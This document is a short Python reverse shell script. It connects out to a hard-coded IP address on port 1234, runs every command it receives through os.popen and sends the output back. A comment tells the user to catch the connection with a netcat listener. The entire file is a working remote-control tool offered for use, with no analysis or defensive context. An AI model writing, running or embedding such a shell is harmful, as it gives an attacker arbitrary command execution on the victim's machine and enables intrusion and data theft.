# Python3
# be sure to be listening on a server on the right port "nc -lvp 1234"
import socket
import os
import subprocess
from subprocess import check_output

s = socket.socket()
host = socket.gethostname()
ip = '172.29.114.11'  # enter your own one here
port = 1234

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    # endless loop to capture all input from the clients side
    while True:
        
        command_input = s.recv(1024).decode('utf-8') # pick the clients input (commands)

        output_command=os.popen(command_input).read() # execute the commands on the windows commandline
        
        s.send(bytes(output_command, 'utf-8'))  # send the output back to the client

